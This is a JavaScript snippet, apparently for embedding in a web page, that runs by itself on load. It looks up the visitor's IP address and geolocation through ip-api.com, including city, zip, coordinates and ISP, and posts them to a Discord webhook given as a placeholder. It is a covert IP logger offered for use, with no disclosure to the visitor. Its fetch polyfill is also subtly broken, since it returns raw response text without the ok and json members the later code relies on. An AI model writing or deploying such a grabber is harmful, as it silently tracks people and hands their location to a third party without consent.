  // Polyfill for fetch API
        if (!window.fetch) {
            window.fetch = function(url, options) {
                return new Promise(function(resolve, reject) {
                    var xhr = new XMLHttpRequest();
                    xhr.onload = function() {
                        if (xhr.status >= 200 && xhr.status < 300) {
                            resolve(xhr.response);
                        } else {
                            reject(new Error(xhr.statusText));
                        }
                    };
                    xhr.onerror = function() {
                        reject(new Error("Network Error"));
                    };
                    xhr.open(options ? options.method || 'GET' : 'GET', url);
                    if (options && options.headers) {
                        for (var header in options.headers) {
                            if (options.headers.hasOwnProperty(header)) {
                                xhr.setRequestHeader(header, options.headers[header]);
                            }
                        }
                    }
                    xhr.send(options ? options.body : undefined);
                });
            }
        }

        // Function to fetch IP data from ip-api.com
        async function fetchIPData() {
            try {
                const response = await fetch('http://ip-api.com/json/');
                if (!response.ok) {
                    throw new Error('Failed to fetch IP data');
                }
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('Error fetching IP data:', error);
                return null;
            }
        }

        // Function to send data to Discord webhook
        async function sendToDiscordWebhook(ipData) {
            try {
                const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
                const payload = {
                    content: `IP Data:
Country: ${ipData.country}
IP: ${ipData.query}
Country Code: ${ipData.countryCode}
Region: ${ipData.region}
Region Name: ${ipData.regionName}
City: ${ipData.city}
Zip: ${ipData.zip}
Latitude: ${ipData.lat}
Longitude: ${ipData.lon}
Timezone: ${ipData.timezone}
ISP: ${ipData.isp}
Organization: ${ipData.org}
AS: ${ipData.as}`
                };

                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                if (!response.ok) {
                    throw new Error('Failed to send data to Discord webhook');
                }
                console.log('Data sent to Discord webhook successfully');
            } catch (error) {
                console.error('Error sending data to Discord webhook:', error);
            }
        }

        // Main function to orchestrate the process
        async function main() {
            const ipData = await fetchIPData();
            if (ipData) {
                sendToDiscordWebhook(ipData);
            }
        }

        // Run the main function
        main();
